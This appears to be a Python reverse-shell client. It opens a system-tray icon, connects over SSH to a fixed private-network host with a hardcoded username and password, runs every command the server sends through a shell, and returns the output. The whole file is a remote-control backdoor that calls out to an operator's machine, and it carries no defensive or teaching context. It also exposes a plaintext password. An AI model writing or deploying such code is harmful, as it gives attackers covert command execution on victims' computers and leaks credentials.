import paramiko
from colorama import Fore
import subprocess
import sys
import pystray

SERVER_IP = '192.168.1.50'  # Server IP address
USERNAME = 'unix'
PASSWORD = 'Gr24091996*'
PORT = 2222

menu = pystray.Menu()
icon = pystray.Icon("client", menu=menu)

icon.run()


print(Fore.YELLOW + f"Starting Script...")

client = paramiko.SSHClient()

# Automatically adds the hostname and server host key to the local ‘HostKeys’.
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    # Connect to the SSH server.
    client.connect(SERVER_IP, port=PORT, username=USERNAME, password=PASSWORD)

    # Open a session channel.
    chan = client.get_transport().open_session()

    while True:
        # Receive a command from the server.
        command = chan.recv(1024).decode('utf-8')

        if not command:
            break

        print(Fore.YELLOW + f"Received command from server: {command}")

        try:
            # Execute the command and capture the output.
            print(Fore.YELLOW + f"Executing command: {command}")
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            stdout, stderr = process.communicate()
            print(Fore.YELLOW + f"Command output: {stdout}")
            output = stdout + stderr
        except Exception as e:
            output = str(e)

        # Send the command's output back to the server.
        chan.sendall(output.encode('utf-8'))
    
finally:
    # Close the SSH client.
    client.close()
    sys.exit(0)
